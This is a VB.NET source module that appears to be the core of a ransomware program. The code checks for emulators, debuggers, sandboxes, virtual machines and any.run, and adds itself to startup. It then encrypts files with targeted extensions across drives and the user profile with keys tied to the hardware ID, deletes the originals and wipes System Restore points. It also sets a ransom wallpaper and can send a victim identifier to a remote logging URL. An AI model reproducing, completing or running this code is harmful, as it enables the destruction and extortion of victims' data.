﻿Imports System
Imports System.IO
Imports System.Security
Imports System.Security.Cryptography
Imports System.Threading
Imports System.Text
Imports System.Net

Module Module1
    Dim fsInput As System.IO.FileStream
    Dim fsOutput As System.IO.FileStream
    Dim bytKey As Byte()
    Dim bytIV As Byte()
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Dim textbox As String
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Public protect
    Public list As List(Of String) = New List(Of String)()
    Sub main()

        Dim createdNew As Boolean = False
        MT = New Mutex(True, Class1.Settings.mute, createdNew)
        If Not createdNew Then
            End
        End If

        If Class1.Settings.Emulator Then
            If Anti.Emulator Then
                End
            End If
        End If

        If Class1.Settings.DetectDebugger Then
            If Anti.DetectDebugger Then
                End
            End If
        End If

        If Class1.Settings.DetectSandboxie Then
            If Anti.DetectSandboxie Then
                End
            End If
        End If


        If Class1.Settings.DetectVirtualMachine Then
            If Anti.DetectVirtualMachine Then
                End
            End If
        End If

        If Class1.Settings.anyrun Then
            If Anti.anyrun Then
                End
            End If
        End If






        If Class1.Settings.startup Then
            startup(Application.ExecutablePath)
        End If
        Class1.Settings.hash = Bot()
        If GetSetting("F", "0", Class1.Settings.Setting) = "Done" Then

        Else
            If GetSetting("F", "0", Class1.Settings.Setting) = Nothing Then
                Dim sb As New StringBuilder()
                Dim rand As New Random()
                For i As Integer = 1 To Class1.Settings.maxrandom
                    Dim idx As Integer = rand.Next(0, Class1.Settings.validchars.Length)
                    Dim randomChar As Char = Class1.Settings.validchars(idx)
                    sb.Append(randomChar)
                Next i
                Dim randomString = sb.ToString()
                SaveSetting("F", "0", Class1.Settings.Setting, check.AES_Encrypt(randomString, HWID() & HWID()))
                SaveSetting("G", "0", Class1.Settings.Setting, check.AES_Encrypt(Class1.Settings.Setting, check.AES_Decrypttt(GetSetting("F", "0", Class1.Settings.Setting), HWID() & HWID())))

            End If

        End If





        If GetSetting("C", "0", Class1.Settings.Setting) = "Done" Then

        Else
            On Error Resume Next
            bytKey = CreateKey(check.AES_Decrypttt(GetSetting("F", "0", Class1.Settings.Setting), HWID() & HWID()))
            bytIV = CreateIV(check.AES_Decrypttt(GetSetting("F", "0", Class1.Settings.Setting), HWID() & HWID()))
            For Each drive In Environment.GetLogicalDrives
                Dim Driver As DriveInfo = New DriveInfo(drive)

                If Driver.Name = Path.GetPathRoot(Environment.SystemDirectory()) Then

                Else
                    For Each Dir As String In Directory.GetDirectories(drive)

                        If Dir.EndsWith("Bin") Then
                        Else
                            If Dir.EndsWith("indows") Then
                            Else
                                If Dir.EndsWith("erfLogs") Then
                                Else
                                    If Dir.EndsWith("System Volume Information") Then
                                    Else
                                        If Dir.EndsWith("cache") Then
                                        Else
                                            If Dir.EndsWith("sers") Then
                                            Else
                                                If Dir.EndsWith("rogram Files (x86)") Then
                                                Else
                                                    If Dir.EndsWith("rogram Files") Then
                                                    Else
                                                        If Dir.EndsWith("boot") Then
                                                        Else
                                                            If Dir.EndsWith("efi") Then
                                                            Else
                                                                If Dir.EndsWith("rogramData") Then
                                                                Else

                                                                    For Each ifilesinfo As String In outonly(Dir, Class1.Settings.mExtesiones)
                                                                        If ifilesinfo = Nothing Then
                                                                        Else
                                                                            If list.Contains(ifilesinfo) Then
                                                                            Else
                                                                                list.Add(ifilesinfo)
                                                                            End If
                                                                        End If
                                                                    Next
                                                                End If

                                                            End If
                                                        End If
                                                    End If
                                                End If

                                            End If
                                        End If
                                    End If
                                End If
                            End If
                        End If

                    Next

                    For Each ifilesinfo As String In inonly(Driver.Name, Class1.Settings.mExtesiones)
                        If ifilesinfo = Nothing Then
                        Else
                            If list.Contains(ifilesinfo) Then
                            Else
                                list.Add(ifilesinfo)
                            End If
                        End If
                    Next

                End If


            Next

            For Each ifilesinfo As String In inonly(Environ$("USERPROFILE"), Class1.Settings.mExtesiones)
                If ifilesinfo = Nothing Then
                Else
                    If list.Contains(ifilesinfo) Then
                    Else
                        list.Add(ifilesinfo)
                    End If
                End If
            Next

            For Each Dir As String In Directory.GetDirectories((Environ$("USERPROFILE")))
                For Each ifilesinfo As String In outonly(Dir, Class1.Settings.mExtesiones)
                    If ifilesinfo = Nothing Then
                    Else
                        If list.Contains(ifilesinfo) Then
                        Else
                            list.Add(ifilesinfo)
                        End If
                    End If

                Next
            Next


            For Each ifilesinfo In list
                If IO.File.Exists(ifilesinfo) Then
                    EncryptOrDecryptFile(ifilesinfo, ifilesinfo & Class1.Settings.exs, _
                          bytKey, bytIV, CryptoAction.ActionEncrypt)
                End If

            Next




            Form1.BackgroundWorker1.RunWorkerAsync()


        End If











        On Error Resume Next



        For Each drive In Environment.GetLogicalDrives
            Dim Driver As DriveInfo = New DriveInfo(drive)

            If Driver.Name = Path.GetPathRoot(Environment.SystemDirectory()) Then

            Else
                For Each Dir As String In Directory.GetDirectories(drive)

                    If Dir.EndsWith("Bin") Then
                    Else
                        If Dir.EndsWith("indows") Then
                        Else
                            If Dir.EndsWith("erfLogs") Then
                            Else
                                If Dir.EndsWith("System Volume Information") Then
                                Else
                                    If Dir.EndsWith("cache") Then
                                    Else
                                        If Dir.EndsWith("sers") Then
                                        Else
                                            If Dir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If Dir.EndsWith("rogram Files") Then
                                                Else
                                                    If Dir.EndsWith("boot") Then
                                                    Else
                                                        If Dir.EndsWith("efi") Then
                                                        Else
                                                            If Dir.EndsWith("rogramData") Then
                                                            Else

                                                                For Each ifilesinfo As String In enc1(Dir)
                                                                    If ifilesinfo = Nothing Then
                                                                    Else
                                                                        If Form4.listenc.Contains(ifilesinfo) Then
                                                                        Else
                                                                            Form4.listenc.Add(ifilesinfo)
                                                                        End If
                                                                    End If
                                                                Next
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next

                For Each ifilesinfo As String In enc2(Driver.Name)
                    If ifilesinfo = Nothing Then
                    Else
                        If Form4.listenc.Contains(ifilesinfo) Then
                        Else
                            Form4.listenc.Add(ifilesinfo)
                        End If
                    End If
                Next

            End If


        Next

        For Each ifilesinfo As String In enc2((Environ$("USERPROFILE")))
            If ifilesinfo = Nothing Then
            Else
                If Form4.listenc.Contains(ifilesinfo) Then
                Else
                    Form4.listenc.Add(ifilesinfo)
                End If
            End If
        Next

        For Each Dir As String In Directory.GetDirectories((Environ$("USERPROFILE")))
            For Each ifilesinfo As String In enc1(Dir)
                If ifilesinfo = Nothing Then
                Else
                    If Form4.listenc.Contains(ifilesinfo) Then
                    Else
                        Form4.listenc.Add(ifilesinfo)
                    End If
                End If

            Next
        Next

        If Class1.Settings.Del = "OK" Then
            del.del()
        End If
        If Class1.Settings.DeleteRestorePoints Then
            DeleteRestorePoints()
        End If

        Dim tmp As String = IO.Path.GetTempPath & "Cry.img"
        If IO.File.Exists(tmp) Then
        Else
            My.Resources.background.Save(tmp, System.Drawing.Imaging.ImageFormat.Bmp)
        End If
        SystemParametersInfo(SETDESKWALLPAPER, 0, tmp, UPDATEINIFILE)
        Form1.ShowDialog()
    End Sub
    Public Function outonly(ruta As String, mExtesiones As IEnumerable(Of String)) As IEnumerable(Of String)
        Return (From ifilesinfo In IO.Directory.GetFiles(ruta, "*", IO.SearchOption.AllDirectories) Where mExtesiones.Contains(IO.Path.GetExtension(ifilesinfo).ToLower())).ToList()
    End Function
    Public Function inonly(ruta As String, mExtesiones As IEnumerable(Of String)) As IEnumerable(Of String)
        Return (From ifilesinfo In IO.Directory.GetFiles(ruta, "*") Where mExtesiones.Contains(IO.Path.GetExtension(ifilesinfo).ToLower())).ToList()
    End Function

    Public Function enc1(ruta As String)
        Return (From ifilesinfo In IO.Directory.GetFiles(ruta, "*" & Class1.Settings.exs, IO.SearchOption.AllDirectories))
    End Function
    Public Function enc2(ruta As String)
        Return (From ifilesinfo In IO.Directory.GetFiles(ruta, "*" & Class1.Settings.exs))
    End Function
    Private Enum CryptoAction
        ActionEncrypt = 1
    End Enum

    Private Sub EncryptOrDecryptFile(ByVal strInputFile As String, _
                                     ByVal strOutputFile As String, _
                                     ByVal bytKey() As Byte, _
                                     ByVal bytIV() As Byte, _
                                     ByVal Direction As CryptoAction)

        On Error Resume Next
        fsInput = New System.IO.FileStream(strInputFile, FileMode.Open, _
                                           FileAccess.Read)
        fsOutput = New System.IO.FileStream(strOutputFile, FileMode.OpenOrCreate, _
                                            FileAccess.Write)
        fsOutput.SetLength(0)

        Dim bytBuffer(4096) As Byte
        Dim lngBytesProcessed As Long = 0
        Dim lngFileLength As Long = fsInput.Length
        Dim intBytesInCurrentBlock As Integer
        Dim csCryptoStream As CryptoStream
        Dim cspRijndael As New System.Security.Cryptography.RijndaelManaged
        Select Case Direction
            Case CryptoAction.ActionEncrypt
                csCryptoStream = New CryptoStream(fsOutput, _
                cspRijndael.CreateEncryptor(bytKey, bytIV), _
                CryptoStreamMode.Write)
        End Select
        While lngBytesProcessed < lngFileLength
            intBytesInCurrentBlock = fsInput.Read(bytBuffer, 0, 4096)
            csCryptoStream.Write(bytBuffer, 0, intBytesInCurrentBlock)
            lngBytesProcessed = lngBytesProcessed + CLng(intBytesInCurrentBlock)
        End While
        csCryptoStream.Close()
        fsInput.Close()
        fsOutput.Close()
        If Direction = CryptoAction.ActionEncrypt Then
            Dim fileOriginal As New FileInfo(strInputFile)
            fileOriginal.Delete()
        End If

    End Sub
    Private Function CreateKey(ByVal strPassword As String) As Byte()
        Dim chrData() As Char = strPassword.ToCharArray
        Dim intLength As Integer = chrData.GetUpperBound(0)
        Dim bytDataToHash(intLength) As Byte
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next
        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        Dim bytKey(31) As Byte
        For i As Integer = 0 To 31
            bytKey(i) = bytResult(i)
        Next
        Return bytKey
    End Function
    Private Function CreateIV(ByVal strPassword As String) As Byte()
        Dim chrData() As Char = strPassword.ToCharArray
        Dim intLength As Integer = chrData.GetUpperBound(0)
        Dim bytDataToHash(intLength) As Byte
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next
        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        Dim bytIV(15) As Byte
        For i As Integer = 32 To 47
            bytIV(i - 32) = bytResult(i)
        Next
        Return bytIV
    End Function
    Public MT As Object = Nothing
    Function startup(ByVal filename As String)
        Try
            Dim st As String = Environment.GetFolderPath(7) & "\" & Class1.Settings.mute & ".exe"
            If IO.File.Exists(st) Then
                protect = New FileStream((st), FileMode.Open)
            Else
                IO.File.Copy(filename, st)
                protect = New FileStream((st), FileMode.Open)
            End If
        Catch ex As Exception
        End Try
    End Function
    <Runtime.InteropServices.DllImport("Srclient.dll")>
    Public Function SRRemoveRestorePoint(index As Integer) As Integer
    End Function
    Private Sub DeleteRestorePoints()
        Try
            Dim objClass As New Management.ManagementClass("\\.\root\default", "systemrestore", New System.Management.ObjectGetOptions())
            Dim objCol As Management.ManagementObjectCollection = objClass.GetInstances()

            For Each objItem As Management.ManagementObject In objCol
                SRRemoveRestorePoint(CUInt(objItem("sequencenumber")).ToString())
            Next
        Catch ex As Exception
        End Try
    End Sub
    Public Function Bot()
        Try
            Return UserName() & "_" & HWID()
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Function UserName()
        Try
            Return Environment.UserName
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Function HWID() As String
        Try
            Dim tohash As String = Identifier("Win32_Processor", "ProcessorId")
            tohash += "-" & Identifier("Win32_BIOS", "SerialNumber")
            tohash += "-" & Identifier("Win32_BaseBoard", "SerialNumber")
            tohash += "-" & Identifier("Win32_VideoController", "Name")
            Return MD5HASH(tohash)
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Private Function Identifier(ByVal wmiClass As String, ByVal wmiProperty As String) As String
        Try
            Dim result As String = ""
            Dim mc As Management.ManagementClass = New Management.ManagementClass(wmiClass)
            Dim moc As Management.ManagementObjectCollection = mc.GetInstances()
            For Each mo As Management.ManagementObject In moc
                If result = "" Then
                    Try
                        result = mo(wmiProperty).ToString()
                        Exit For
                    Catch
                    End Try
                End If
            Next
            Return result
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Function MD5HASH(ByVal input As String) As String
        Try
            Dim md5 As System.Security.Cryptography.MD5CryptoServiceProvider = New System.Security.Cryptography.MD5CryptoServiceProvider()
            Dim temp As Byte() = md5.ComputeHash(System.Text.Encoding.UTF8.GetBytes(input))
            Dim sb As System.Text.StringBuilder = New System.Text.StringBuilder()
            For i As Integer = 10 To temp.Length - 1
                sb.Append(temp(i).ToString("x2"))
            Next
            Return sb.ToString().ToUpper()
        Catch ex As Exception
            Return "Error"
        End Try
    End Function
    Public Function sends(ByVal info As String) As Boolean
        Try

            Dim strReq As String
            Dim strData As String
            Dim dataStream As Stream
            Dim reader As StreamReader
            Dim request As WebRequest
            Dim response As WebResponse

            strReq = Class1.Settings.logg & "?" & info
            request = WebRequest.Create(strReq)
            response = request.GetResponse()
            dataStream = response.GetResponseStream()
            reader = New StreamReader(dataStream)
            strData = reader.ReadToEnd()
            reader.Close()
            response.Close()
            Return True
        Catch ex As Exception
        End Try
    End Function
End Module
